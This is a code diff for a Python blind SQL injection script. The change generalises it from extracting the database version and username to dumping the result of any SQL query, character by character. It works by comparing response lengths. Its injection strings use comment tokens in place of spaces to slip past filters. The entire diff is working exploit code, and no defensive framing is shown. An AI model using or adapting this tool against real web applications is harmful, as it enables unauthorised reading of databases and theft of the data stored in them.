@@ -22,28 +22,22 @@ def sqli_false_len(entry_point):
     return int(r.headers['Content-Length'])
 
 def main():
-    if len(sys.argv) != 2:
-        print('(+) usage example: %s http://localhost?param= ' %sys.argv[0])
+    if len(sys.argv) != 3:
+        print('(+) usage example: {} "http://localhost?param=" "select version()"'.format(sys.argv[0]))
     entry_point = sys.argv[1]
+    query = sys.argv[2].replace(' ', '/**/')
     true_len=sqli_true_len(entry_point)
     false_len=sqli_false_len(entry_point)
     if (true_len==false_len):
         print('(-) Entry point is not vulnerable to injection')
         sys.exit()
-    print("(+) Retrieving database version....")
-    # 19 is length of the version() string
-    for i in range(1, 20): 
-        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i 
-        extracted_char = chr(sqli(entry_point, injection_string, true_len)) 
-        print(extracted_char, end='', flush=True)
-    print("\n(+) Retrieving username....")
-    #16 is the maximum length of username
-    for i in range(1, 17):
-        injection_string = "test')/**/or/**/(ascii(substring((select/**/user()),%d,1)))=[CHAR]%%23" % i 
+    i = 1
+    while True:
+        injection_string = "test')/**/or/**/(ascii(substring(({}),{},1)))=[CHAR]%23".format( query, i )
         try:
             extracted_char = chr(sqli(entry_point, injection_string, true_len)) 
             print(extracted_char, end='', flush=True)
-        #if username is smaller than 16
+            i+=1
         except TypeError:
             break
     print("\n(+) done!")
